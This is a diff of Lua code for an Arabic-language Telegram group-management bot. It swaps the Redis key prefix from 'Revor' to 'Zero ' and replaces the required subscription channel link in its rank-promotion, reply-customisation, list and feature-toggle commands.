 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙تم تعطيل (الرفع) من قبل المنشئين","md",true)
 end 
-if Redis:sismember(Revor.."Revor:Addictive:Group"..msg_chat_id,UserId[2]) then
+if Redis:sismember(Zero .."Zero :Addictive:Group"..msg_chat_id,UserId[2]) then
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId[2],"⌔︙تم ترقيته ادمن  مسبقا ").Reply,"md",true)  
 else
-Redis:sadd(Revor.."Revor:Addictive:Group"..msg_chat_id,UserId[2]) 
+Redis:sadd(Zero .."Zero :Addictive:Group"..msg_chat_id,UserId[2]) 
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId[2],"⌔︙تم ترقيته ادمن  ").Reply,"md",true)  
 end
 end
@@ -3514,16 +3517,16 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-if not msg.Originators and not Redis:get(Revor.."Revor:Status:SetId"..msg_chat_id) then
+if not msg.Originators and not Redis:get(Zero .."Zero :Status:SetId"..msg_chat_id) then
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙تم تعطيل (الرفع) من قبل المنشئين","md",true)
 end 
-if Redis:sismember(Revor.."Revor:Distinguished:Group"..msg_chat_id,UserId[2]) then
+if Redis:sismember(Zero .."Zero :Distinguished:Group"..msg_chat_id,UserId[2]) then
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId[2],"⌔︙تم ترقيته مميز  مسبقا ").Reply,"md",true)  
 else
-Redis:sadd(Revor.."Revor:Distinguished:Group"..msg_chat_id,UserId[2]) 
+Redis:sadd(Zero .."Zero :Distinguished:Group"..msg_chat_id,UserId[2]) 
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId[2],"⌔︙تم ترقيته مميز  ").Reply,"md",true)  
 end
 end
@@ -3533,104 +3536,104 @@ local Teext = text:match("^تغير رد المطور (.*)$")
 if not msg.Managers then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(6)..' }* ',"md",true)  
 end
-Redis:set(Revor.."Revor:Developer:Bot:Reply"..msg.chat_id,Teext)
+Redis:set(Zero .."Zero :Developer:Bot:Reply"..msg.chat_id,Teext)
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙ تم تغير رد المطور الى :"..Teext)
 elseif text and text:match("^تغير رد المنشئ الاساسي (.*)$") then
 if not msg.Managers then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(6)..' }* ',"md",true)  
 end
 local Teext = text:match("^تغير رد المنشئ الاساسي (.*)$") 
-Redis:set(Revor.."Revor:President:Group:Reply"..msg.chat_id,Teext)
+Redis:set(Zero .."Zero :President:Group:Reply"..msg.chat_id,Teext)
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙ تم تغير رد المنشئ الاساسي الى :"..Teext)
 elseif text and text:match("^تغير رد المنشئ (.*)$") then
 if not msg.Managers then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(6)..' }* ',"md",true)  
 end
 local Teext = text:match("^تغير رد المنشئ (.*)$") 
-Redis:set(Revor.."Revor:Constructor:Group:Reply"..msg.chat_id,Teext)
+Redis:set(Zero .."Zero :Constructor:Group:Reply"..msg.chat_id,Teext)
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙ تم تغير رد المنشئ الى :"..Teext)
 elseif text and text:match("^تغير رد المالك (.*)$") then
 if not msg.Managers then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(6)..' }* ',"md",true)  
 end
 local Teext = text:match("^تغير رد المالك (.*)$") 
-Redis:set(Revor.."Revor:PresidentQ:Group:Reply"..msg.chat_id,Teext)
+Redis:set(Zero .."Zero :PresidentQ:Group:Reply"..msg.chat_id,Teext)
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙ تم تغير رد المالك الى :"..Teext)
 elseif text and text:match("^تغير رد المدير (.*)$") then
 if not msg.Managers then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(6)..' }* ',"md",true)  
 end
 local Teext = text:match("^تغير رد المدير (.*)$") 
-Redis:set(Revor.."Revor:Manager:Group:Reply"..msg.chat_id,Teext) 
+Redis:set(Zero .."Zero :Manager:Group:Reply"..msg.chat_id,Teext) 
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙ تم تغير رد المدير الى :"..Teext)
 elseif text and text:match("^تغير رد الادمن (.*)$") then
 if not msg.Managers then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(6)..' }* ',"md",true)  
 end
 local Teext = text:match("^تغير رد الادمن (.*)$") 
-Redis:set(Revor.."Revor:Admin:Group:Reply"..msg.chat_id,Teext)
+Redis:set(Zero .."Zero :Admin:Group:Reply"..msg.chat_id,Teext)
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙ تم تغير رد الادمن الى :"..Teext)
 elseif text and text:match("^تغير رد المميز (.*)$") then
 if not msg.Managers then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(6)..' }* ',"md",true)  
 end
 local Teext = text:match("^تغير رد المميز (.*)$") 
-Redis:set(Revor.."Revor:Vip:Group:Reply"..msg.chat_id,Teext)
+Redis:set(Zero .."Zero :Vip:Group:Reply"..msg.chat_id,Teext)
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙ تم تغير رد المميز الى :"..Teext)
 elseif text and text:match("^تغير رد العضو (.*)$") then
 if not msg.Managers then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(6)..' }* ',"md",true)  
 end
 local Teext = text:match("^تغير رد العضو (.*)$") 
-Redis:set(Revor.."Revor:Mempar:Group:Reply"..msg.chat_id,Teext)
+Redis:set(Zero .."Zero :Mempar:Group:Reply"..msg.chat_id,Teext)
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙ تم تغير رد العضو الى :"..Teext)
 elseif text == 'حذف رد المطور' then
 if not msg.Managers then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(6)..' }* ',"md",true)  
 end
-Redis:del(Revor.."Revor:Developer:Bot:Reply"..msg.chat_id)
+Redis:del(Zero .."Zero :Developer:Bot:Reply"..msg.chat_id)
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙تم حدف رد المطور")
 elseif text == 'حذف رد المنشئ الاساسي' then
 if not msg.Managers then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(6)..' }* ',"md",true)  
 end
-Redis:del(Revor.."Revor:President:Group:Reply"..msg.chat_id)
+Redis:del(Zero .."Zero :President:Group:Reply"..msg.chat_id)
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙تم حذف رد المنشئ الاساسي ")
 elseif text == 'حذف رد المالك' then
 if not msg.Managers then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(6)..' }* ',"md",true)  
 end
-Redis:del(Revor.."Revor:PresidentQ:Group:Reply"..msg.chat_id)
+Redis:del(Zero .."Zero :PresidentQ:Group:Reply"..msg.chat_id)
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙تم حذف رد المالك ")
 elseif text == 'حذف رد المنشئ' then
 if not msg.Managers then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(6)..' }* ',"md",true)  
 end
-Redis:del(Revor.."Revor:Constructor:Group:Reply"..msg.chat_id)
+Redis:del(Zero .."Zero :Constructor:Group:Reply"..msg.chat_id)
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙تم حذف رد المنشئ ")
 elseif text == 'حذف رد المدير' then
 if not msg.Managers then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(6)..' }* ',"md",true)  
 end
-Redis:del(Revor.."Revor:Manager:Group:Reply"..msg.chat_id) 
+Redis:del(Zero .."Zero :Manager:Group:Reply"..msg.chat_id) 
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙تم حذف رد المدير ")
 elseif text == 'حذف رد الادمن' then
 if not msg.Managers then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(6)..' }* ',"md",true)  
 end
-Redis:del(Revor.."Revor:Admin:Group:Reply"..msg.chat_id)
+Redis:del(Zero .."Zero :Admin:Group:Reply"..msg.chat_id)
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙تم حذف رد الادمن ")
 elseif text == 'حذف رد المميز' then
 if not msg.Managers then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(6)..' }* ',"md",true)  
 end
-Redis:del(Revor.."Revor:Vip:Group:Reply"..msg.chat_id)
+Redis:del(Zero .."Zero :Vip:Group:Reply"..msg.chat_id)
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙تم حذف رد المميز")
 elseif text == 'حذف رد العضو' then
 if not msg.Managers then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(6)..' }* ',"md",true)  
 end
-Redis:del(Revor.."Revor:Mempar:Group:Reply"..msg.chat_id)
+Redis:del(Zero .."Zero :Mempar:Group:Reply"..msg.chat_id)
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙تم حذف رد العضو")
 end
 if text == 'المطورين الثانويين' or text == 'المطورين الثانوين' then
@@ -3638,10 +3641,10 @@ if not msg.ControllerBot then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(1)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-local Info_Members = Redis:smembers(Revor.."Revor:DevelopersQ:Groups") 
+local Info_Members = Redis:smembers(Zero .."Zero :DevelopersQ:Groups") 
 if #Info_Members == 0 then
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙لا يوجد مطورين حاليا , ","md",true)  
 end
@@ -3664,10 +3667,10 @@ if not msg.DevelopersQ then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(2)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-local Info_Members = Redis:smembers(Revor.."Revor:Developers:Groups") 
+local Info_Members = Redis:smembers(Zero .."Zero :Developers:Groups") 
 if #Info_Members == 0 then
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙لا يوجد مطورين حاليا , ","md",true)  
 end
@@ -3690,10 +3693,10 @@ if not msg.Developers then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(3)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-local Info_Members = Redis:smembers(Revor.."Revor:TheBasicsQ:Group"..msg_chat_id) 
+local Info_Members = Redis:smembers(Zero .."Zero :TheBasicsQ:Group"..msg_chat_id) 
 if #Info_Members == 0 then
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙لا يوجد مالكين حاليا , ","md",true)  
 end
@@ -3716,10 +3719,10 @@ if not msg.TheBasicsm then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(44)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-local Info_Members = Redis:smembers(Revor.."Revor:TheBasics:Group"..msg_chat_id) 
+local Info_Members = Redis:smembers(Zero .."Zero :TheBasics:Group"..msg_chat_id) 
 if #Info_Members == 0 then
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙لا يوجد منشئين اساسيين حاليا , ","md",true)  
 end
@@ -3742,10 +3745,10 @@ if not msg.TheBasics then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(4)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-local Info_Members = Redis:smembers(Revor.."Revor:Originators:Group"..msg_chat_id) 
+local Info_Members = Redis:smembers(Zero .."Zero :Originators:Group"..msg_chat_id) 
 if #Info_Members == 0 then
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙لا يوجد منشئين حاليا , ","md",true)  
 end
@@ -3768,10 +3771,10 @@ if not msg.Originators then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(5)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-local Info_Members = Redis:smembers(Revor.."Revor:Managers:Group"..msg_chat_id) 
+local Info_Members = Redis:smembers(Zero .."Zero :Managers:Group"..msg_chat_id) 
 if #Info_Members == 0 then
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙لا يوجد مدراء حاليا , ","md",true)  
 end
@@ -3794,10 +3797,10 @@ if not msg.Managers then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(6)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-local Info_Members = Redis:smembers(Revor.."Revor:Addictive:Group"..msg_chat_id) 
+local Info_Members = Redis:smembers(Zero .."Zero :Addictive:Group"..msg_chat_id) 
 if #Info_Members == 0 then
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙لا يوجد ادمنيه حاليا , ","md",true)  
 end
@@ -3820,10 +3823,10 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-local Info_Members = Redis:smembers(Revor.."Revor:Distinguished:Group"..msg_chat_id) 
+local Info_Members = Redis:smembers(Zero .."Zero :Distinguished:Group"..msg_chat_id) 
 if #Info_Members == 0 then
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙لا يوجد مميزين حاليا , ","md",true)  
 end
@@ -3846,10 +3849,10 @@ if not msg.ControllerBot then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(1)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-local Info_Members = Redis:smembers(Revor.."Revor:BanAll:Groups") 
+local Info_Members = Redis:smembers(Zero .."Zero :BanAll:Groups") 
 if #Info_Members == 0 then
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙لا يوجد محظورين عام حاليا , ","md",true)  
 end
@@ -3872,10 +3875,10 @@ if not msg.ControllerBot then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(1)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-local Info_Members = Redis:smembers(Revor.."Revor:ktmAll:Groups") 
+local Info_Members = Redis:smembers(Zero .."Zero :ktmAll:Groups") 
 if #Info_Members == 0 then
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙لا يوجد مكتومين عام حاليا , ","md",true)  
 end
@@ -3898,10 +3901,10 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-local Info_Members = Redis:smembers(Revor.."Revor:BanGroup:Group"..msg_chat_id) 
+local Info_Members = Redis:smembers(Zero .."Zero :BanGroup:Group"..msg_chat_id) 
 if #Info_Members == 0 then
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙لا يوجد محظورين حاليا , ","md",true)  
 end
@@ -3924,10 +3927,10 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-local Info_Members = Redis:smembers(Revor.."Revor:SilentGroup:Group"..msg_chat_id) 
+local Info_Members = Redis:smembers(Zero .."Zero :SilentGroup:Group"..msg_chat_id) 
 if #Info_Members == 0 then
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙لا يوجد مكتومين حاليا , ","md",true)  
 end
@@ -3951,15 +3954,15 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
 if TextMsg == 'الرابط' then
-Redis:set(Revor.."Revor:Status:Link"..msg_chat_id,true) 
+Redis:set(Zero .."Zero :Status:Link"..msg_chat_id,true) 
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙تم تفعيل الرابط ","md",true)
 end
 if TextMsg == 'الترحيب' then
-Redis:set(Revor.."Revor:Status:Welcome"..msg_chat_id,true) 
+Redis:set(Zero .."Zero :Status:Welcome"..msg_chat_id,true) 
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙تم تفعيل الترحيب ","md",true)
 end
 if TextMsg == 'الايدي' then
@@ -3967,10 +3970,10 @@ if not msg.Managers then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(6)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:set(Revor.."Revor:Status:Id"..msg_chat_id,true) 
+Redis:set(Zero .."Zero :Status:Id"..msg_chat_id,true) 
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙تم تفعيل الايدي ","md",true)
 end
 if TextMsg == 'الايدي بالصوره' then
@@ -3978,10 +3981,10 @@ if not msg.Managers then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(6)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:set(Revor.."Revor:Status:IdPhoto"..msg_chat_id,true) 
+Redis:set(Zero .."Zero :Status:IdPhoto"..msg_chat_id,true) 
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙تم تفعيل الايدي بالصوره ","md",true)
 end
 if TextMsg == 'ردود المدير' then
@@ -3989,10 +3992,10 @@ if not msg.Managers then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(6)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:set(Revor.."Revor:Status:Reply"..msg_chat_id,true) 
+Redis:set(Zero .."Zero :Status:Reply"..msg_chat_id,true) 
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙تم تفعيل ردود المدير ","md",true)
 end
 if TextMsg == 'ردود المطور' then
@@ -4000,10 +4003,10 @@ if not msg.Managers then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(6)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:set(Revor.."Revor:Status:ReplySudo"..msg_chat_id,true) 
+Redis:set(Zero .."Zero :Status:ReplySudo"..msg_chat_id,true) 
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙تم تفعيل ردود المطور ","md",true)
 end
 if TextMsg == 'الحظر' or TextMsg == 'الطرد' or TextMsg == 'التقييد' then
@@ -4011,10 +4014,10 @@ if not msg.Managers then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(6)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:set(Revor.."Revor:Status:BanId"..msg_chat_id,true) 
+Redis:set(Zero .."Zero :Status:BanId"..msg_chat_id,true) 
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙تم تفعيل الحظر , الطرد , التقييد","md",true)
 end
 if TextMsg == 'الرفع' then
@@ -4022,26 +4025,26 @@ if not msg.Originators then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(5)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:set(Revor.."Revor:Status:SetId"..msg_chat_id,true) 
+Redis:set(Zero .."Zero :Status:SetId"..msg_chat_id,true) 
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙تم تفعيل الرفع ","md",true)
 end
 if TextMsg == 'الالعاب' then
-Redis:set(Revor.."Revor:Status:Games"..msg_chat_id,true) 
+Redis:set(Zero .."Zero :Status:Games"..msg_chat_id,true) 
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙تم تفعيل الالعاب ","md",true)
 end
 if TextMsg == 'التحقق' then
-    Redis:set(Revor.."Revor:Status:joinet"..msg_chat_id,true) 
+    Redis:set(Zero .."Zero :Status:joinet"..msg_chat_id,true) 
     return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙تم تفعيل التحقق ","md",true)
     end
 if TextMsg == 'اطردني' then
